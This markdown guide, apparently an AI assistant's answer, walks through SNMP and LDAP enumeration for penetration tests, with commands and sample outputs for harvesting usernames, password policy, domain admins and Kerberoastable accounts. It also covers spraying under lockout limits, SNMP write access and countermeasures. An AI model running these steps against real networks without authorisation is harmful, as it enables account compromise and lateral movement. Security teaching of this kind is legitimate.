```markdown
# SNMP & LDAP Enumeration – Complete Hands-On Guide

This is a **practical, example-driven** guide to enumerating **SNMP** and **LDAP** services during penetration tests. Every section includes the exact commands, expected outputs, and how to turn the gathered data into further attacks.

---

## Table of Contents

- [Lab Environment (Optional)](#lab-environment-optional)
- [SNMP Enumeration](#snmp-enumeration)
  - [How SNMP Works (In One Minute)](#how-snmp-works-in-one-minute)
  - [Walkthrough: Full SNMP Enumeration from Scratch](#walkthrough-full-snmp-enumeration-from-scratch)
    - [1. Discover SNMP Devices](#1-discover-snmp-devices)
    - [2. Find Valid Community Strings](#2-find-valid-community-strings)
    - [3. Dump System Information](#3-dump-system-information)
    - [4. Extract User Accounts (Windows)](#4-extract-user-accounts-windows)
    - [5. Extract Running Processes & Software](#5-extract-running-processes--software)
    - [6. Exploiting Write Access (Dangerous!)](#6-exploiting-write-access-dangerous)
- [LDAP Enumeration](#ldap-enumeration)
  - [How LDAP Works (In One Minute)](#how-ldap-works-in-one-minute)
  - [Walkthrough: Full LDAP Enumeration from Scratch](#walkthrough-full-ldap-enumeration-from-scratch)
    - [1. Discover Domain Controllers & LDAP Ports](#1-discover-domain-controllers--ldap-ports)
    - [2. Test for Anonymous Bind](#2-test-for-anonymous-bind)
    - [3. Dump All Usernames](#3-dump-all-usernames)
    - [4. Extract Password Policy](#4-extract-password-policy)
    - [5. Map Groups and Domain Admins](#5-map-groups-and-domain-admins)
    - [6. Find Kerberoastable Accounts (SPNs)](#6-find-kerberoastable-accounts-spns)
    - [7. BloodHound Attack Path Analysis](#7-bloodhound-attack-path-analysis)
- [Indirect Enumeration (When LDAP is Blocked)](#indirect-enumeration-when-ldap-is-blocked)
- [Quick Command Cheat Sheet](#quick-command-cheat-sheet)
- [Countermeasures Summary](#countermeasures-summary)

---

## Lab Environment (Optional)
To follow along, you can set up:
- **SNMP**: An Ubuntu VM with `snmpd` installed and configured with `public` community. Or a Windows box with SNMP service enabled.
- **LDAP**: A Windows Server with Active Directory Domain Services, or a lightweight AD lab using [GOAD](https://github.com/Orange-Cyberdefense/GOAD), [BadBlood](https://github.com/davidprowe/BadBlood), or [DetectionLab](https://github.com/clong/DetectionLab).

All examples assume you are on the same network as the targets.

---

## SNMP Enumeration

### How SNMP Works (In One Minute)
- Manager (you) sends a request to an agent (the target) over **UDP 161**.
- The request includes a **community string** (like a password) and the **OID** you want.
- The agent replies with the value of that OID.
- `snmpwalk` sends a series of `GETNEXT` requests to walk the entire MIB tree.

### Walkthrough: Full SNMP Enumeration from Scratch

**Target**: 192.168.1.50 (a Windows 10 box with SNMP enabled, community `public`)

---

#### 1. Discover SNMP Devices
Scan the subnet for open UDP 161:
```bash
nmap -sU -p 161 --open 192.168.1.0/24
```
Output:
```
Nmap scan report for 192.168.1.50
PORT    STATE SERVICE
161/udp open  snmp
```
Now you know a live SNMP agent.

---

#### 2. Find Valid Community Strings
Try common strings with **onesixtyone**:
```bash
echo public > community.txt
echo private >> community.txt
echo manager >> community.txt
onesixtyone -c community.txt 192.168.1.50
```
Output:
```
Scanning 1 hosts, 3 communities
192.168.1.50 [public] Hardware: x86 Family 6 Model 158 Stepping 10 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19044)
```
✅ **`public` works!** The response also leaks the OS version.

---

#### 3. Dump System Information
Run a full `snmpwalk` (this may take a while):
```bash
snmpwalk -v 2c -c public 192.168.1.50
```
First few lines:
```
SNMPv2-MIB::sysDescr.0 = STRING: Hardware: x86 Family 6 Model 158 Stepping 10 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19044)
SNMPv2-MIB::sysObjectID.0 = OID: windowsSnmpAgent
DISMAN-EXPRESSION-MIB::sysUpTimeInstance = Timeticks: (147259) 0:24:32.59
SNMPv2-MIB::sysName.0 = STRING: WIN10-PC
```

You immediately have:
- **OS**: Windows 10 (Build 19044)
- **Hostname**: `WIN10-PC`
- **Uptime**: 24 minutes → freshly booted.

To get a cleaner, structured overview, use **snmp-check**:
```bash
snmp-check 192.168.1.50 -c public
```
Sections include:
- System information (hostname, domain, users)
- Network interfaces (IP, MAC)
- IP routes
- TCP/UDP connections (open ports!)
- Processes
- Storage
- Shares

---

#### 4. Extract User Accounts (Windows)
Windows SNMP agents (when configured) expose local users via the LAN Manager MIB:
```bash
snmpwalk -v 2c -c public 192.168.1.50 1.3.6.1.4.1.77.1.2.25
```
Output:
```
iso.3.6.1.4.1.77.1.2.25.1.1.5.65.100.109.105.110 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.6.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.7.106.100.111.101 = STRING: "jdoe"
```
We now have **valid local usernames**: `Administrator`, `Guest`, `jdoe`. These can be used for password attacks.

---

#### 5. Extract Running Processes & Software
Processes:
```bash
snmpwalk -v 2c -c public 192.168.1.50 1.3.6.1.2.1.25.4.2.1.2
```
Output snippet:
```
HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: "System Idle Process"
HOST-RESOURCES-MIB::hrSWRunName.4 = STRING: "smss.exe"
...
HOST-RESOURCES-MIB::hrSWRunName.652 = STRING: "firefox.exe"
```
You can see a user is running Firefox. If you find outdated software (e.g., Java 1.8.0_131), you can exploit known CVEs.

Installed software:
```bash
snmpwalk -v 2c -c public 192.168.1.50 1.3.6.1.2.1.25.6.3.1.2
```

---

#### 6. Exploiting Write Access (Dangerous!)
If you discover the **read-write** community (often `private`), you can:
- Reboot the device: `snmpset -v 2c -c private 192.168.1.50 1.3.6.1.4.1... i 1`
- Change routing table entries.
- Modify network interface state (disable/enable).

Always **check with extreme caution**. In a pentest, confirm and stop—do not disrupt unless explicitly allowed.

---

## LDAP Enumeration

### How LDAP Works (In One Minute)
- LDAP queries are sent to a domain controller over **TCP 389 (or 636 for LDAPS)**.
- You bind (authenticate) as a user, or try **anonymous bind**.
- You send a search request with a **base DN** (e.g., `DC=domain,DC=com`) and an **LDAP filter** (e.g., `(objectClass=user)`).
- The server returns matching objects with the attributes you requested.

### Walkthrough: Full LDAP Enumeration from Scratch

**Target**: `dc.corp.local` (192.168.1.10), Windows Domain Controller.

---

#### 1. Discover Domain Controllers & LDAP Ports
Find DCs and confirm LDAP is open:
```bash
nmap -p 389,636,3268,3269 192.168.1.10
```
Output:
```
PORT     STATE SERVICE
389/tcp  open  ldap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Often you'll find the DC by its DNS name; you can also run:
```bash
nslookup -type=SRV _ldap._tcp.corp.local
```

---

#### 2. Test for Anonymous Bind
Try to connect without credentials:
```bash
ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local" 
```
- If it returns tons of data → **anonymous bind enabled** (critical finding).
- If it returns `inappropriate authentication` or `unwilling to perform`, anonymous is disabled.

Many modern ADs disable anonymous bind by default, but you can still query with a valid user account. For the rest of this walkthrough, we'll assume you have a low-privileged domain user: `corp\jdoe:Spring2024`.

---

#### 3. Dump All Usernames
With credentials:
```bash
ldapsearch -x -H ldap://192.168.1.10 \
  -D "cn=jdoe,cn=Users,dc=corp,dc=local" -w 'Spring2024' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```
Output (truncated):
```
# jdoe, Users, corp.local
dn: CN=John Doe,CN=Users,DC=corp,DC=local
sAMAccountName: jdoe

# adunn, Users, corp.local
dn: CN=Alice Dunn,CN=Users,DC=corp,DC=local
sAMAccountName: adunn

# svc_backup, Users, corp.local
dn: CN=Backup Service,CN=Users,DC=corp,DC=local
sAMAccountName: svc_backup
...
```
Now you have a **valid user list** ready for password spraying.

A faster method is **windapsearch** (Python):
```bash
windapsearch --dc-ip 192.168.1.10 -d corp.local -u jdoe -p Spring2024 --module users
```
It prints a clean table of usernames and DN.

---

#### 4. Extract Password Policy
Before spraying, check the lockout threshold and password complexity:
```bash
ldapsearch -x -H ldap://192.168.1.10 -D "cn=jdoe,cn=Users,dc=corp,dc=local" -w 'Spring2024' \
  -b "DC=corp,DC=local" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration minPwdLength pwdProperties
```
Output:
```
lockoutThreshold: 5
lockoutDuration: -18000000000 (30 minutes)
minPwdLength: 7
pwdProperties: 1 (DOMAIN_PASSWORD_COMPLEX)
```
Interpretation:
- Account locks after 5 bad attempts → spray carefully.
- 30‑minute lockout → you can try 1 password every 31 minutes per user, or use a list of only 4-5 passwords.

---

#### 5. Map Groups and Domain Admins
Find Domain Admins group:
```bash
ldapsearch -x -H ldap://192.168.1.10 -D "cn=jdoe,cn=Users,dc=corp,dc=local" -w 'Spring2024' \
  -b "CN=Domain Admins,CN=Users,DC=corp,DC=local"
```
Output shows `member` attributes listing DNs of admin users. Translate them:
```
member: CN=Administrator,CN=Users,DC=corp,DC=local
member: CN=Alice Dunn,CN=Users,DC=corp,DC=local
```
Now you know `adunn` is a domain admin—a prime target for keylogging or token theft.

With **windapsearch**:
```bash
windapsearch --dc-ip 192.168.1.10 -d corp.local -u jdoe -p Spring2024 --module domain-admins
```

---

#### 6. Find Kerberoastable Accounts (SPNs)
Look for service accounts with SPNs:
```bash
ldapsearch -x -H ldap://192.168.1.10 -D "cn=jdoe,cn=Users,dc=corp,dc=local" -w 'Spring2024' \
  -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```
Output:
```
# svc_sql, Users, corp.local
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sql.corp.local:1433

# svc_backup, Users, corp.local
sAMAccountName: svc_backup
servicePrincipalName: backup/backup.corp.local
```
These are perfect for **Kerberoasting**: request their TGS tickets and crack offline.

Use **Impacket's GetUserSPNs**:
```bash
impacket-GetUserSPNs corp.local/jdoe:Spring2024 -dc-ip 192.168.1.10 -request
```
This outputs encrypted TGS hashes; crack them with hashcat mode 13100.

---

#### 7. BloodHound Attack Path Analysis
The ultimate LDAP data collection. Run SharpHound on a domain-joined machine (or via runas):
```powershell
SharpHound.exe --CollectionMethod All --Domain corp.local
```
This produces a zip file. Load it into BloodHound, then:
- Search for "Shortest Paths to Domain Admins"
- Look for **Kerberoastable** users, **unconstrained delegation** machines, or **AS-REP roastable** accounts.
- Find sessions of admins on workstations.

The visual graph instantly shows you next steps.

---

## Indirect Enumeration (When LDAP is Blocked)
If port 389 is firewalled, you can still enumerate AD via:

- **RPC (135/445)**:  
  ```bash
  rpcclient -U "" -N 192.168.1.10
  > enumdomusers
  ```
- **SMB**:  
  ```bash
  crackmapexec smb 192.168.1.10 --users
  ```
- **Kerberos username brute-force**:  
  ```bash
  kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt
  ```
- **DNS zone transfer** (rare):  
  ```bash
  dig axfr @192.168.1.10 corp.local
  ```

All these can give you similar data without touching LDAP.

---

## Quick Command Cheat Sheet

### SNMP
```bash
# Scan
nmap -sU -p 161 --open 192.168.1.0/24

# Community brute
onesixtyone -c community.txt 192.168.1.50

# Full walk
snmpwalk -v 2c -c public 192.168.1.50

# Nice report
snmp-check 192.168.1.50 -c public

# Windows users
snmpwalk -v 1 -c public 192.168.1.50 1.3.6.1.4.1.77.1.2.25

# Write a value (careful)
snmpset -v 2c -c private 192.168.1.50 <OID> i 1
```

### LDAP
```bash
# Anonymous bind test
ldapsearch -x -H ldap://dc.corp.local -b "DC=corp,DC=local"

# Authenticated user dump
ldapsearch -x -H ldap://dc.corp.local -D "cn=jdoe,cn=Users,dc=corp,dc=local" -w 'pass' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Domain admins
ldapsearch ... -b "CN=Domain Admins,CN=Users,DC=corp,DC=local"

# SPNs for kerberoasting
ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# Quick windapsearch
windapsearch --dc-ip 192.168.1.10 -d corp.local -u jdoe -p pass --module users
windapsearch --dc-ip 192.168.1.10 -d corp.local -u jdoe -p pass --module domain-admins

# Kerberoasting
impacket-GetUserSPNs corp.local/jdoe:pass -dc-ip 192.168.1.10 -request

# BloodHound collection
SharpHound.exe --CollectionMethod All
```

---

## Countermeasures Summary
- **SNMP**: Disable if not needed. Use SNMPv3 with strong auth+encryption. Change community strings. Restrict source IPs.
- **LDAP**: Disable anonymous bind. Monitor for bulk queries (SIEM alerts). Enforce LDAP signing & channel binding. Limit “Authenticated Users” permissions. Apply strong password policies. Put admins in Protected Users group.

This version gives you **a complete, reproducible walkthrough** of both protocols with realistic outputs and actions. You can copy-paste it directly into your repository or notes. If you want me to add even more detail (e.g., interpreting NTLM hashes, or using Metasploit modules), just say the word.
